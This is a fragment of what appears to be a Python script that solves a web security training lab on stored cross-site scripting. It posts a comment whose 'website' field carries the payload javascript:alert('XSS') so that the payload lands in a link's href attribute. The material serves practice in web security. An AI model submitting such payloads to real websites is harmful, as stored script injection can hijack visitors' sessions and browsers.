...
parser = argparse.ArgumentParser(description='Solves the following Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded')
...
data={'csrf':csrf,'postId':'1','comment':'XSS','name':'Stored XSS','email':'xss@xss.com', 'website':"javascript:alert('XSS')"}
